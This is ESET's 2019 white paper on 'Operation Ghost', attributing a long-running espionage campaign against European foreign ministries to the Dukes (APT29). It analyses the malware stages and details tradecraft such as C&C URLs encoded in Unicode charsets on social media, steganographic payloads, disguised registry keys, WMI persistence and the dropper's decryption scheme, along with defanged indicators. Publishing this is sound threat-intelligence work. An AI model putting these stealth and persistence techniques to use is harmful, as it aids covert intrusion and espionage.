ESET Research White papers // October 2019OPERATION GHOST The Dukes aren’t back — they never leftMatthieu Faou Mathieu Tartare Thomas DupuyTABLE OF CONTENTS 1. Executive summary . . . . . . . . . . . . . . . . . . . . . 42. Background . . . . . . . . . . . . . . . . . . . . . . . .4 2.1 Timeline . . . . . . . . . . . . . . . . . . . . . . . 4 2.2 Targets . . . . . . . . . . . . . . . . . . . . . . . 5 2.3 Tools and tactics . . . . . . . . . . . . . . . . . . . . 63. Operation Ghost . . . . . . . . . . . . . . . . . . . . . . 7 3.1 Targets and timeline . . . . . . . . . . . . . . . . . . . 7 3.2 Attribution to the Dukes . . . . . . . . . . . . . . . . . 8 3.3 Tactics and tools . . . . . . . . . . . . . . . . . . . . 10 3.4 Operational times . . . . . . . . . . . . . . . . . . . 114. Technical analysis . . . . . . . . . . . . . . . . . . . . . . 4.1 Compromise vector . . . . . . . . . . . . . . . . . . . 12 4.2 PolyglotDuke: the first stage . . . . . . . . . . . . . . . . 18 4.3 RegDuke: a first-stage implant . . . . . . . . . . . . . . . 4.4 MiniDuke backdoor: the second stage. . . . . . . . . . . . . 21 4.5 FatDuke: the third stage . . . . . . . . . . . . . . . . . 23 4.6 LiteDuke: the former third stage . . . . . . . . . . . . . . 305. Conclusion. . . . . . . . . . . . . . . . . . . . . . . . .336. Bibliography . . . . . . . . . . . . . . . . . . . . . . .347.Indicators of Compromise . . . . . . . . . . . . . . . . . . 36 7.1 Hashes . . . . . . . . . . . . . . . . . . . . . . . 36 7.2 Network . . . . . . . . . . . . . . . . . . . . . . . 368. MITRE ATT&CK techniques . . . . . . . . . . . . . . . . . . 38LIST OF TABLES Table 7List of parameters used to generate GET request to the C&C server 14 Example of redirection from the C&C servers’ root URLs 16 List of execution type combination and their corresponding behavior 18 RegDuke Windows registry keys 19 Hardcoded User-Agent 25 FatDuke backdoor commands 27 User-Agent strings used by LiteDuke 33LIST OF FIGURES Figure 1 Dukes history timeline– newly discovered items related to Operation Ghostare shaded 6 Figure 2 Historical malicious email example 7 Figure 3 Decoy document opened by the malicious attachment 7 Figure 4 Reddit post containing an encoded C&C URL 9 Figure 5 Timeline of Operation Ghost 9 Figure 6 Comparison of a custom string encryption function found in PolyglotDukeand in OnionDuke samples from 2013 10Figure 7 Comparison of the same function in MiniDuke from 2014 and inMiniDuke from 2018 11 Summary of Operation Ghost malware platform 12 Figure 8 Figure 9 Dukes operational hours 13 Figure 10 Example of a public post containing an encoded C&C URL 14 Figure 11 C&C response with a path to an image to download 16 Figure 12 Communication sequence with the C&C server 16 Figure 13 Embedded blob format 17 Figure 14 Decompiled hash signature verification procedure 18 Figure 15 Public key used to verify the hash signature 18 Figure 16 Encrypted blob format after decryption 18 Figure 17 Obfuscated RegDuke sample 19 Figure 18 RegDuke The path, password and salt are hardcoded in this example 19 Figure 19 Decryption of RegDuke payload 20 Figure 20 Dropbox backdoor configuration (redacted) 20 Figure 21 Example of two pictures downloaded from the Dropbox directory 21 Figure 22 Loop extracting a payload from the pixels of a downloaded picture 21 Figure 23 The least significant bits of each color of each pixel are extracted to recoverthe hidden data 21 Figure 24 Comparison between a blue of value 255 and a blue of value 248 22Figure 25 Invalid digital signature added to the backdoor 22 23 Figure 26 Control flow flattening used to obfuscate the MiniDuke backdoor Figure 27 Post request to the C&C server that looks like a regular jpeg file upload 23 Figure 28 FatDuke configuration data in the PE resources 24 25 Figure 29 FatDuke configuration example Figure 30 FatDuke C&C protocol 26 Figure 31 Additional image tag sent by FatDuke C&C 27 Figure 32 C&C response including most of a valid PNG header and an encryptedcommand for FatDuke27 Figure 33 Example of commands sent to FatDuke 28 Figure 34 FatDuke obfuscation – String stacking 29 Figure 35 FatDuke obfuscation – Opaque predicate 29 Figure 36 FatDuke obfuscation – Junk function call 30 Figure 37 FatDuke obfuscation – Junk function return value 30 Figure 38 FatDuke obfuscation – Chromium strings 30 Figure 39 LiteDuke unpacking process 31 Figure 40 Curious phone number left by the attackers 31 Figure 41 Assembler used by the developer (screenshot of DIE analysis) 32 Figure 42 Multiple while loops instead of a backdoor switch case 33 Figure 43 List of LiteDuke command IDs 33 Figure 44 LiteDuke C&C domain, resources and parameters 3451. EXECUTIVE SUMMARY It is exceptionally rare for a well-documented threat actor, previously implicated in very high-profile attacks, to stay completely under the radar for several years. Yet, in the last three years that is what APT group the Dukes (aka APT29 and Cozy Bear) has done. Despite being well known as one of the groups to hack the Democratic National Committee in the run-up to the 2016 US election, the Dukes has received little subse- quent attention. The last documented campaign attributed to them is a phishing campaign against the Norwegian government that dates back to January 2017.In this white paper, we describe how we uncovered that the Dukes had been running successful espionage campaigns while avoiding public scrutiny, thanks to stealthy communication techniques and retooling. We call these newly uncovered Dukes campaigns, collectively, Operation Ghost, and describe how the group has been busy compromising government targets, including three European Ministries of Foreign Affairs and the Washington DC embassy of a European Union country, all without drawing attention to their activities. Key points in this white paper:The Dukes never stopped their espionage activities.• Operation Ghost likely started in 2013. • The last known activity linked to Operation Ghost occurred in June 2019. • ESET researchers identified at least three victims: all European Ministries of Foreign Affairs includingthe Washington DC embassy of a European Union country.• The Dukes have used four new malware families in this campaign: PolyglotDuke, RegDuke, FatDukeand LiteDuke.• Operation Ghost uses a previously documented Dukes backdoor: MiniDuke. • The Dukes have leveraged online services such as Twitter, Imgur and Reddit to act as primary Commandand Control (C&C) channels for their first-stage malware.• The Dukes have used very stealthy techniques such as steganography to hide communications betweencompromised machines and their C&C servers.For any inquiries related to this white paper, contact us at threatintel@eset com.2. BACKGROUND The Dukes, also known as APT29 and Cozy Bear, is an infamous cyberespionage group active since at least 2008. In particular, it is known for being one of the adversaries to have breached the Democratic National Committee during the 2016 US presidential election [1]. It was even featured in a joint report issued by the FBI and the Department of Homeland Security (DHS), as part of malicious cyber-activities the report dubbed Grizzly Steppe [2]. That report was published in 2017 and describes malicious activities that occurred around the presidential election of 2016.This section is a summary of the group’s previously documented activities to refresh the reader’s memory, since the last related publication dates from almost three years ago. Our most recent discoveries are detailed in the subsequent sections of this white paper.2.1 Timeline Even though the group’s activities are believed to have started in 2008, the first public report was released in 2013 with the analysis of MiniDuke by Kaspersky [3]. Over the next two years, multiple reports dissected the Dukes’ arsenal, including a comprehensive summary by F-Secure of the group’s activities from 2008 to 2015 [4].One of the most recent attacks that we can link to the Dukes is the January 2017 phishing attempt against the Ministry of Foreign Affairs, the Labour Party and the Armed Forces of Norway [5]. Since then, most security experts have believed the Dukes went dark or completely changed their arsenal to pursue their mission.6In November 2018, a strange phishing campaign hit dozens of different organizations in the United States, including government agencies, and think tanks. The attack leveraged a malicious Windows shortcut (a .lnk file) that bore similarities to a malicious shortcut used by the Dukes in 2016. However, that earlier sample was available in a public malware repository for many years, allowing another actor to easily conduct a false-flag operation. In addition, there is no evidence that any custom malware used only by the Dukes was employed during this attack. From FireEye’s detailed analysis of the attack [6], it was not possible to make a high-confidence attribution to this threat actor.Figure 1 summarizes the important events of the Dukes history. Some activities related to Operation Ghost are also presented to help understand the overlap between all the events.(cid:31)(cid:30)(cid:30)(cid:29)(cid:31)(cid:30)(cid:28)(cid:27)(cid:31)(cid:30)(cid:28)(cid:27)N E WDukes’ ﬁrst known activitiesFirst public report by Kaspersky Labs(cid:31)(cid:30)(cid:28)(cid:25)AugustN E W(cid:31)(cid:30)(cid:28)(cid:25)First known activity linked to Operation Ghost by ESET(cid:31)(cid:30)(cid:28)6SeptemberN E WFirst known deployment of the RegDuke malwareGrizzly Steppe report by the FBI and the DHSFirst known deployment of the latest third(cid:141)stage implant: FatDukeNewly discovered items related to Operation Ghost(cid:31)(cid:30)(cid:28)(cid:24)Attack against the US Democratic National Committee †discovered in ‡ˆ‰Š‹(cid:31)(cid:30)(cid:28)8October(cid:31)(cid:30)(cid:28)(cid:23)JuneLast known Twitter account registered by the DukesLatest observed activityFigure 1 // Dukes history timeline2.2 Targets Over the years, it has been possible to draw the big picture of the Dukes main targets. The group is primarily interested in spying on governments either in the West or in former USSR countries. Besides governments, the group has also targeted various organizations linked to NATO, think tanks, and political parties.This targeting suggests a clear interest in collecting information allowing a better understanding of future international political decisions, which would seem of most interest to a government. Unlike other groups such as GreyEnergy [7] and TeleBots [8], it is important to note that we have never seen the Dukes engaged in cybersabotage operations.Surprisingly though, the group also has conducted spying operations outside its main focus. In 2013, Kaspersky researchers found evidence that part of the Dukes toolset had been used against drug dealers in Russia [9]. This may suggest that this toolset is not only used for collecting foreign intelligence but also for conducting LE investigations of criminal activities.72.3 Tools and tactics The Dukes group is known to be a major player in the espionage scene. It is associated with a large toolset with more than ten different malware families written in C/C++ [10], PowerShell [11], .NET [12] and Python [13]. It has also adopted living-off-the-land tactics, misusing standard IT tools such as PsExec and Windows Management Instrumentation (WMI).As mentioned before, we invite our readers to read the F-Secure summary [4] for an analysis of the earlier malware platforms used by this threat actor.Delivery The group’s main initial tactic to breach a network is to send spearphishing emails that contain a link or an attachment. Figure 2 is an example of one such campaign, which occurred at the end of 2016. In order to increase the attackers’ chances, it is designed to be a subject of particular interest of the recipient. This is different from mass-spreading malicious email campaigns where the same email is sent to hundreds or thousands of people by crimeware actors.Source: url volexity com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/Figure 2 // Historical malicious email example.When targets click on these malicious links or attachments, a .zip archive that contains a malicious, macro-enabled Word document and a decoy (as shown in Figure 3) will be downloaded. If victims then open the malicious document and enable the macro, it will then install the PowerDuke backdoor [14]. In other cases, malicious Windows shortcuts (.lnk files) have been used instead of Word documents with malicious macros.Figure 3 // Decoy document opened by the malicious attachment8However, this is not the only method used by the Dukes to gain initial access. In 2014, the Dukes started using two mass-spreading methods to deliver the OnionDuke implant:• Trojanized pirated applications downloaded via BitTorrent • A malicious TOR exit node to trojanize downloaded applications on the fly [15] [16]OnionDuke has some capabilities outside the standard espionage features, such as a Denial of Service (DoS) module, but we have not observed them used in the wild.Finally, the Dukes are also known for using multiple implants to compromise a target. It is very common to see an implant delivering another one to regain control of a system.Command and Control (C&C) The Dukes have employed several interesting tactics to hide the communications between the implants and their C&C servers, including the use of social media platforms and steganography.MiniDuke [17] and HammerDuke [12] leveraged Twitter to host their C&C URLs. In addition, they use a Domain Generation Algorithm (DGA) to generate new Twitter handles. Each time the malware generates a new handle, it fetches the Twitter page corresponding to that handle and searches the page for a specific pattern, which is the encrypted C&C URL.In CloudDuke [18], the operators leveraged cloud storage services such as OneDrive as their C&C channels. They were not the first group to use this technique, but it is generally effective for the attackers as it is harder for defenders to spot hostile connections to legitimate cloud storage services than to other “suspicious” or low-reputation URLs.Moreover, the Dukes like to use steganography to hide data, such as additional payloads, in pictures. It allows them to blend into typical network traffic by transferring valid images while its true purpose is to allow the backdoor to communicate with the C&C server. This technique has been described in Volexity’s PowerDuke blogpost [14].3. OPERATION GHOST After 2017, it was not clear how the Dukes evolved. Did they totally stop their activities? Did they fully re-write their tools and change their tradecraft?We spent months apparently chasing a ghost then, a few months ago, we were able to attribute several distinct intrusions to the Dukes. During the analysis of those intrusions, we uncovered several new malware families: PolyglotDuke, RegDuke and FatDuke. We call the Dukes’ campaigns using these newly discovered tools Operation Ghost3.1 Targets and timeline We believe Operation Ghost started in 2013 and was still ongoing as of this writing. Our research shows that the Ministry of Foreign Affairs in at least three different countries in Europe are affected by this cam- paign. We also have discovered an infiltration by the Dukes at the Washington, DC embassy of a European Union country.This targeting is not surprising, and it shows that the Dukes are still active in high-profile organizations. We also believe that more organizations around the world might be affected but due to the use of unique C&C infrastructure for each victim, we were not able to identify other targets.One of the first traces of this campaign is to be found on Reddit in July 2014. Figure 4 shows a message posted by one of the Dukes’ operators. The strange string using an unusual charset is the encoded URL of a C&C server and is used by PolyglotDuke as described in section 4 2.9Figure 4 // Reddit post containing an encoded C&C URLFigure 5 presents the timeline of Operation Ghost. As it is based on ESET telemetry, it might be only a partial view of a broader campaign.(cid:31)(cid:30)(cid:29)(cid:26) SeptemberN E W(cid:31)(cid:30)(cid:29)(cid:25) July(cid:31)(cid:30)(cid:29)6 SeptemberN E WFirst known compilation timestamp of PolyglotDukePost on Reddit containing an encoded C&C URLFirst known deployment in the wild of a FatDuke sample(cid:31)(cid:30)(cid:29)(cid:27) OctoberPublication of this report(cid:31)(cid:30)(cid:29)(cid:27) June(cid:31)(cid:30)(cid:29)8 OctoberLatest known FatDuke sample deployed in the wildLast Twitter account registered by the DukesFigure 5 // Timeline of Operation Ghost(cid:31)(cid:30)(cid:29)(cid:23) AugustN E WFirst known deployment in the wild of a RegDuke sample3.2 Attribution to the DukesIt is important to note that when we describe so-called “APT groups”, we’re making connections based on technical indicators such as code similarities, shared C&C infrastructure, malware execution chains, and so on We’re typically not directly involved in the investigations and identification of the individuals writing the malware and/or deploying it, and the interpersonal relationships between them Furthermore, the term “APT group” is very loosely defined, and often used merely to cluster the abovementioned malware indicators This is also one of the reasons why we refrain from speculation with regard to attributing attacks to nation states and suchOn one hand, we noticed numerous similarities in the tactics of this campaign in comparison to previously documented ones:• Use of Twitter (and other social websites such as Reddit) to host C&C URLs. • Use of steganography in pictures to hide payloads or C&C communications. • Use of Windows Management Instrumentation (WMI) for persistence.10We also noticed important similarities in the targeting:• All the known targets are Ministries of Foreign Affairs. • Two of the three known targeted organizations were previously compromised by other Dukes malwaresuch as CozyDuke, OnionDuke or MiniDuke.• On some machines compromised with PolyglotDuke and MiniDuke, we noticed that CozyDukewas installed only a few months before.However, an attribution based only on the presence of known Dukes tools on the same machines should be taken with a grain of salt. We also found two other APT threat actors – Turla [19] and Sednit [20] – on some of the same computers.On the other hand, we were able to find strong code similarities between already documented samples and samples from Operation Ghost. We cannot discount the possibility of a false flag operation; however, this campaign started while only a small portion of the Dukes’ arsenal was known. In 2013, at the first known compilation date of PolyglotDuke, only MiniDuke had been documented and threat analysts were not yet aware of the importance of this threat actor. Thus, we believe Operation Ghost was run simultaneously with the other campaigns and has flown under the radar until now.PolyglotDuke (SHA-1: D09C4E7B641F8CB7CC86190FD9A778C6955FEA28), documented in detail in section 4 2 uses a custom encryption algorithm to decrypt the strings used by the malware. We found functionally equivalent code in an OnionDuke sample (SHA-1: A75995F94854DEA8799650A2F4A97980B71199D2) that was documented by F-Secure in 2014 [16]. It is interesting to note that the value used to seed the srand function is the compilation timestamp of the executable. For instance, 0x5289f207 corresponds to Mon 18 Nov 2013 10:55:03 UTC.The IDA screenshots in Figure 6 show the two similar functions.PolyglotDukeOnionDukeFigure 6 // Comparison of a custom string encryption function found in PolyglotDukeand in OnionDuke samples from 2013Similarly, the recent samples of the MiniDuke backdoor bear similarities with samples documented more than five years ago. Figure 7 is the comparison of a function in a MiniDuke backdoor listed by Kaspersky in 2014 [21] (SHA-1: 86EC70C27E5346700714DBAE2F10E168A08210E4) and a MiniDuke backdoor (SHA-1: B05CABA461000C6EBD8B237F318577E9BCCD6047) compiled in August 2018.11MiniDuke from 2014MiniDuke from 2018Figure 7 // Comparison of the same function in MiniDuke from 2014 and in MiniDuke from 2018Given the numerous similarities between other known Dukes campaigns and Operation Ghost, especially the strong code similarities, and the overlap in time with previous campaigns, we assess with high confidence that this operation is run by the Dukes.3.3 Tactics and tools In Operation Ghost, the Dukes have used a limited number of tools, but they have relied on numerous interesting tactics to avoid detection.First, they are very persistent. They steal credentials and use them systematically to move laterally on the network. We have seen them using administrative credentials to compromise or re-compromise machines on the same local network. Thus, when responding to a Dukes compromise, it is important to make sure to remove every implant in a short period of time. Otherwise, the attackers will use any remaining implant to compromise the cleaned systems again.Second, they have a sophisticated malware platform divided in four stages:• PolyglotDuke, which uses Twitter or other websites such as Reddit and Imgur to get its C&C URL.It also relies on steganography in pictures for its C&C communication.• RegDuke, a recovery first stage, which uses Dropbox as its C&C server. The main payload is encryptedon disk and the encryption key is stored in the Windows registry. It also relies on steganography as above.• MiniDuke backdoor, the second stage. This simple backdoor is written in assembly. It is very similarto older MiniDuke backdoors.• FatDuke, the third stage. This sophisticated backdoor implements a lot of functionalities and has a veryflexible configuration. Its code is also well obfuscated using many opaque predicates. They re-compile it and modify the obfuscation frequently to bypass security product detections.Figure 8 is a summary of the malware platform of Operation Ghost. During our investigation, we also found a previously unknown (and apparently now retired) third-stage backdoor, LiteDuke, that was used back in 2015. For the sake of historical completeness, it is analyzed in section 4 6.12InitialCompromiseStage (cid:127)Stage (cid:129)Stage (cid:141)Hypothesis(cid:12)(cid:7)Malicious documentsent by emailStolen credentials & lateral movementFetchthe C&C URLPolyglotDukeRegDukeOnline ServiceDownloads a picture from the C&C serverDownloads a picturefrom the Dropbox accountDecrypt and dropDecode, decryptand dropMiniDukeDownloads a picture from the C&C serverDecrypt and dropFatDukeFigure 8 // Summary of Operation Ghost malware platformThird, we also noticed that the operators avoid using the same C&C network infrastructure between different victim organizations. This kind of compartmentalization is generally only seen by the most meticulous attackers. It prevents the entire operation from being burned when a single victim discovers the infection and shares the related network IoCs with the security community.3.4 Operational times When it comes to cyberespionage, it is not uncommon for the malware developers and operators to follow the standard working hours of the country where they are located. For instance, we previously showed that Sednit operators were generally working from 9 AM to 5PM in the UTC+3 time zone [20]. Previously, FireEye researchers noticed that the Dukes were also mainly operating in the UTC+3 time zone [12].For Operation Ghost, we compiled three different types of timestamp in order to have an idea of their operational times:• The time at which they uploaded C&C pictures to the Dropbox account used by RegDuke • The time at which they posted encoded C&C URLs on the social media accounts used by PolyglotDuke • The compilation timestamps of dozens of samples. We believe they were not tampered with,as they are consistent with what we see in ESET telemetry data.It should be noted that some of these timestamps may have been generated by an automated command system or an automated build system.13Figure 9 shows the distribution of the operational hours of the Dukes in the three different time zones. The distribution aligns well with working hours in a UTC+2 or UTC+3 time zone, with occasional work during the night. This might be explained by a need to work at the same time as some of their victims.Numberof timestamps(cid:26)(cid:28)(cid:27)(cid:30)(cid:29)(cid:28)(cid:31)(cid:30)(cid:28)Operational HoursUTC +(cid:9) timezoneUTC timezoneHourUTC +(cid:8) timezone(cid:28)(cid:25)(cid:27)(cid:26)(cid:24)(cid:31)(cid:28)(cid:31)(cid:25)(cid:31)(cid:27)(cid:31)(cid:26)(cid:31)(cid:24)(cid:25)(cid:28)(cid:25)(cid:25)Figure 9 // Dukes operational hours4. TECHNICAL ANALYSIS In this part, we present the technical analyses of the different malware stages used in Operation Ghost4.1 Compromise vector Despite having analyzed the Dukes activities in several different organizations, we were not able to find the initial compromise vector. The group is known for sending well-crafted malicious emails, but we did not find any such samples.It should also be noted that two of the three targeted organizations we identified had previously been compromised by the Dukes, mainly in 2015. As such, it is highly possible that the attackers kept control over the compromised networks during this whole period. We observed them pivoting in an already-compromised network using lateral movement tools like PsExec and stolen administrative credentials. As such, from only a few compromised machines, they are able to expand their operations.4.2 PolyglotDuke: the first stage PolyglotDuke is a downloader that is used to download and drop the MiniDuke backdoor. As mentioned in section 3 2 and shown in Figure 6, this downloader shares several similarities with other samples from previous Dukes campaigns such as the use of Twitter to retrieve and decode its C&C server address, as well as a custom string encryption implementation. Both 32- and 64-bit versions of PolyglotDuke were observed and have similar behavior. We dubbed this downloader PolyglotDuke in reference to its use of charsets from different languages to encode the C&C addresses.14Dropper PolyglotDuke’s dropper embeds an encrypted PolyglotDuke within a resource type named GIF with the ID 129. The resource is encrypted with the following algorithm, using the string GIF89 from the resource (which is the 5 first magic bytes of the start of the GIF header) as the key:clearText[i] = (i / 5) ^ cypherText[i] ^ aGif89[i % 5] After decryption, the DLL is written to the current working directory and executed using rundll32.exe. The custom string encryption algorithm used by the PolyglotDuke dropper is identical to the one used by PolyglotDuke, as well as other samples from previous Dukes campaigns, and is depicted in Figure 7.As mentioned in section 3 2, it’s worth noting that this dropper shares a great deal of functionality with OnionDuke, such as the use of a GIF resource, the use of the same algorithm with the string GIF89 as key to decrypt the resource, and the use of the same custom encryption algorithm to encrypt the strings.C&C server address retrieval from public webpages Strings from PolyglotDuke are decrypted using two different algorithms. The string is either RC4 encrypted using the CryptDecrypt API where the key is derived from the system directory path with the drive letter removed, or using the custom encryption algorithm shown in Figure 6. An IDA Python script to decrypt these strings is provided in our GitHub repository.The C&C server address is retrieved and decoded from various public webpages such as Imgur, ImgBB or Fotolog posts, tweets, Reddit comments, Evernote public notes, etc. Several encrypted public webpage URLs are hardcoded in each sample (from three to six URLs in a single sample) and it will iterate over the hardcod- ed list of C&C server addresses until it is able to decode a valid C&C URL successfully. An example of a public webpage containing an encoded C&C URL is shown Figure 10.Figure 10 // Example of a public post containing an encoded C&C URLAfter retrieving the content of one of these webpages, PolyglotDuke parses it to find two delimiter strings and extracts the content between them. The extracted UTF-8 string uses a particular character set within a Unicode block such as Katakana [22], Cherokee [23] or Kangxi radicals [24]. Any given sample can only decode a C&C URL encoded in one of those charsets. The string is first converted to UTF-16, only the last byte of each codepoint is kept, then a custom mapping is used to transpose this to printable ASCII. The order of the characters of the resulting string is then reversed, resulting in the C&C URL. A script to decrypt the C&C URL, regardless of the Unicode range used, is provided on our GitHub repository.15PolyglotDuke, a multilingual downloaderKatakana is a Japanese syllabary (part of the Japanese writing system), while Cherokee syllabary is used to write Cherokee (which is a Haudenosaunee language), and Kangxi radicals are components of Chinese characters. The use of these character sets from different languages is the reason we named this downloader PolyglotDuke: ⿔⿕Interestingly, the text from the delimiter strings usually makes sense in the context of the fake post. The decoded C&C URL points to a PHP script with which the downloader communicates using GET requests, as described in the next section.Communication with the C&C server Once the C&C server URL is decoded, the compromised computer sends HTTP GET requests with arguments using the following format:GET example.com/name. php?[random_param1]=[random_string1]&[random_param2]=[random_string2] Only the argument values are relevant here as the argument names are selected randomly from a hardcod- ed list. The list of argument names used is shown in Table 1. This makes the communication between PolyglotDuke and the C&C server difficult to identify because there are no obvious patterns. Additionally, the User-Agent header used to perform the GET requests is a common one:Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)Table 1List of parameters used to generate GET request to the C&C serverList of hardcoded argument namesaction v16The GET argument values are randomly generated but the first random string in each request should comply with a constraint based on a specific integer (see below). A string will be randomly regenerated until one complies with the constraints. The digits from the string representation of the MD5 hash of the randomly generated string are summed, and then modulo 5 of this value must match a specific integer.The communication with the C&C server to retrieve a payload follows this sequence:•• First the communication with the C&C server is checked. The sum of the digits of the MD5 hash of the first argument modulo 5 should be equal to 4. The response of the C&C server is matched with the second random string as it will echo back this string in case of successful communication. If the communication with the C&C server is successful, a custom hash from the concatenation of the username and the volume serial number of the disk of the current directory is generated and sent twice. The modulo 5 value of the MD5 hash of the first parameters of these requests should be 0 and 2 respectively. In the response to the second request, search for <img src=” and the next “> strings in the last response and extract the image filename between them, if present. Figure 11 shows a C&C server response at the identification step, with a path to an image (cuteanimals12.jpg in this case). If a filename was extracted in the preceding step, the file is retrieved into the directory whose name is the unique ID sent twice at the registration step: GET example.com/<Username_VolumeID_Hash>/cuteanimals12.jpg••Figure 11 // C&C response with a path to an image to downloadThis sequence continues until a path to a file is provided between the <img src=” and “> strings and the file downloaded. The communication steps are summarized in Figure 12.PolyglotDukeTwitter, ImgurRedditC&C serverRetrieve C&C addressCommunication checkIdentiﬁcationGet imgEchoPath to ﬁleImgTimeFigure 12 // Communication sequence with the C&C server17Interestingly, the root URLs of the C&C server used by PolyglotDuke redirect to domains with similar names hosting legitimate websites. This technique is probably used in order to avoid suspicion when investigating the traffic with the C&C server. For one of the C&C servers, the attackers forgot to add a TLD to the redirect- ed domain. Examples of redirection are shown in Table 2.Table 2Example of redirection from the C&C servers’ root URLsC&C server domain name rulourialuminiu.co[.]uk powerpolymerindustry[.]com ceycarb[.]comRedirection target ceycarb (invalid, missing TLD)Payload decryption and execution A data blob containing encrypted data is appended to the end the downloaded file: this technique allows data to be easily included in a JPEG or PNG image download in a way that means the image remains valid. We couldn’t retrieve any of the files downloaded by PolyglotDuke to confirm this hypothesis but the way the encrypted blob is added to such files in addition to their extension being .jpg or .png lead us to think that they were valid images used to look like legitimate traffic.To extract the payload from the file downloaded from the C&C server, PolyglotDuke will first decrypt the last eight bytes with RC4 using the same key as the one used for strings decryption. The first four decrypted bytes correspond the offset to the embedded blob relative to the end of the file and the last four bytes provide a value used as integrity check; that value is the same as the first four bytes at the beginning of the blob.The structure of the file is described in Figure 13.DWORDDWORDDWORDSize(cid:27)x(cid:25)(cid:27)(cid:27)DWORDIMGIMG(cid:28)x(cid:26)BD(cid:23)(cid:22)(cid:28)(cid:26)(cid:28)sizeRC(cid:12) encrypted PESignatureO(cid:20)setRC(cid:12)encryptedo(cid:20)setRC(cid:12)encrypted (cid:28)x(cid:26)BD(cid:23)(cid:22)(cid:28)(cid:26)(cid:28)Figure 13 // Embedded blob formatAfter obtaining the offset to the embedded blob and checking the integrity value, the size of the RC4-en- crypted blob is retrieved from immediately afterward. Then, next to the encrypted blob, we find the signed SHA-1 hash of the blob. Before decrypting the blob, the hash signature is checked against an RC4-encoded public key hardcoded in the binary. The signature verification procedure is shown in Figure 14 , while the public key used to check the hash signature is shown in Figure 15.18Figure 14 // Decompiled hash signature verification procedureFigure 15 // Public key used to verify the hash signatureThis technique ensures that only a payload signed by the operators could be executed on the victim’s machine, since the private key used to sign the hash is needed to generate a valid signature.After having successfully checked the hash signature of the encrypted blob, it is decrypted using the same key used for the RC4-encrypted strings. The format of the decrypted blob is shown in Figure 16.DWORDPE SizeDWORDFilename size(cid:31)x(cid:29)BD(cid:26)(cid:25)(cid:31)(cid:29)(cid:31)(cid:29)Exec type(cid:29) (cid:11)(cid:31)x(cid:29)BD(cid:26)(cid:25)(cid:31)(cid:29)(cid:31)PE SizePE(cid:31)x(cid:29)BD(cid:26)(cid:25)(cid:31)(cid:29)(cid:31) FilenamesizeFilenameFigure 16 // Encrypted blob format after decryptionNotice that the same delimiter value is used and checked at various positions of the blob (in the example in Figure 16 it is 0x1BD75010). Two of the bytes between the first two delimiters define the action to be taken with the decrypted blob.The value immediately following the second delimiter is the size of the data, being either a PE or an encrypted configuration, followed by the data itself followed by a third delimiter, the size of the subsequent filename, and finally the filename itself. The correct extension (.dll or .exe) will be appended to the filename of the PE to be written, depending on the executable type. The list of valid combinations and their respective behaviors is shown on Table 3.19Table 3List of execution type combination and their corresponding behaviorexec type 1exec type 20 write the executable to disk and launch it using CreateProcess write the DLL to disk and launch it using rundll32.exe write the DLL to disk and load it using LoadLibraryW write the encrypted JSON config to the registry, updating the list of public pages to parse for encoded C&C addresses4.3 RegDuke: a first-stage implant RegDuke is a first-stage implant that is apparently used only when attackers lose control of the other implants on the same machine. Its purpose is to stay undetected as long as possible to help make sure the operators never lose complete control of any compromised machine.It is composed of a loader and a payload, the latter being stored encrypted on the disk. Both components are written in .NET. RegDuke persists by using a WMI consumer named MicrosoftOfficeUpdates. It is launched every time a process named WINWORD.EXE is started. Our analysis is based on the sample with SHA-1 0A5A7DD4AD0F2E50F3577F8D43A4C55DDC1D80CF.The loader Between August 2017 and June 2019, we have seen four different main versions of the loader. The first version was not obfuscated and had the encryption key hardcoded in the code. Later versions read the encryption key from the Windows registry and use different types of obfuscation such as control-flow flattening or directly using NET Reactor, a commercial obfuscator. Figure 17 is a sample of RegDuke obfuscated with .NET Reactor.Figure 17 // Obfuscated RegDuke sampleThe flow of the loader is simple. It reads the encrypted file at either a hardcoded path or at a value extracted from the Windows registry, as shown in Figure 18.Figure 18 // RegDuke. The path, password and salt are hardcoded in this example.20Then, it decrypts it using a password and a salt either hardcoded in the loader or stored in the Windows registry. The encryption key and the initialization vector are derived from the password and the salt using the technique described in RFC 2898, also known as PBKDF2, as shown in Figure 19.Figure 19 // Decryption of RegDuke payloadIn all the samples we have seen, they use only the three different registry keys listed in Table 4. It is interesting to note that attackers seem to have put some effort at selecting registry keys and values that might look legitimate.Table 4RegDuke Windows registry keysRegistry KeyValue containing the directory of the payloadValue containing the filename of the payloadValue containing the password and the saltHKEY_LOCAL_MACHINE\SOFTWARE\Intel\ MediaSDK\Dispatch\0102 HKEY_LOCAL_MACHINE\SOFTWARE\Intel\ MediaSDK\Dispatch\hw64-s1-1 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ MSBuild\4.0PathCPACPAmoduleRootPathAPIModuleInitStackMSBuildOverride- TasksPathDefaultLibsBinaryCacheFinally, the decrypted Windows Executable is loaded using the Assembly.Load method. We only found one payload, but we cannot be certain that others are not deployed in the wild.The payload: a fileless, Dropbox-controlled backdoor The payload is a backdoor that resides in memory only, and that uses Dropbox as its C&C server. Its configuration is hardcoded in an internal class, shown in Figure 20. Our analysis is based on the sample with SHA-1 5905C55189C683BC37258AEC28E916C41948CD1C.Figure 20 // Dropbox backdoor configuration (redacted)We have seen the following clientId values being used: collection_3, collection_4, collection_6, collection_7, collection_8 and collection_99. However, other than collection_4, we were not able to determine the targets for these collections.21The backdoor regularly lists the Dropbox directory corresponding to its clientId and downloads PNG files from it. The downloaded PNG files are valid pictures, as you can see in Figure 21.Figure 21 // Example of two pictures downloaded from the Dropbox directoryHowever, the attackers have used steganography to hide data in the pictures. In Figure 22, you can see the code looping over all the pixels of the image and extracting data from them.Figure 22 // Loop extracting a payload from the pixels of a downloaded pictureEach pixel is encoded into 24 bits: 8 for red, 8 for green and 8 for blue. The developers use a technique called “Least Significant Bit” to store 8 bits of data in each pixel, as shown in Figure 23. This technique has been used previously by other malware such as Gozi [25]. They extract two bits from the red value, three from the green and three from the blue.RedGreenBlue(cid:31)(cid:30)(cid:31)(cid:30)(cid:31)(cid:30)(cid:30)(cid:31)(cid:30)(cid:30)(cid:30)(cid:30)(cid:31)(cid:31)(cid:30)(cid:31)(cid:31)(cid:30)(cid:30)(cid:30)(cid:31)(cid:31)(cid:31)(cid:30)(cid:30)(cid:31)(cid:31)(cid:30)(cid:31)(cid:31)(cid:31)(cid:30)Figure 23 // The least significant bits of each color of each 